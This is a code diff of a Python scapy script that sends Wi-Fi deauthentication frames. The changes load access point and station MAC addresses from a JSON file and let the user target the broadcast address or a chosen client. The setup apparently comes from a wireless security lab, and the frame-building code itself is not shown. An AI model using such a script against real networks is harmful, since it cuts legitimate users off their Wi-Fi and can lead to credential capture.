@@ -2,11 +2,12 @@ from scapy.all import *
 from scapy.layers.dot11 import *
 import os
 
-with open("attackerDevice/devices.json", "r") as file:
+with open("devices.json", "r") as file:
     data = json.load(file)
 
-# SSH Configuration
+# MACS
 AP_MAC = data["TrustedAP"][0]["mac"]
+STA_MACS = [sta["mac"] for sta in data["STA"]]
 
 def deauth_frame(target_mac):
     # Create a deauthentication frame
@@ -36,6 +37,8 @@ def start_deauthentication_frame_generator():
     if use_defaults == "y":
         STA_mac = "FF:FF:FF:FF:FF:FF"    
     elif use_defaults == "n":
+        print("specify which mac to deauthenticate: ")
+        print(STA_MACS)
         STA_mac = input("Enter the STA MAC address: ")
 
 
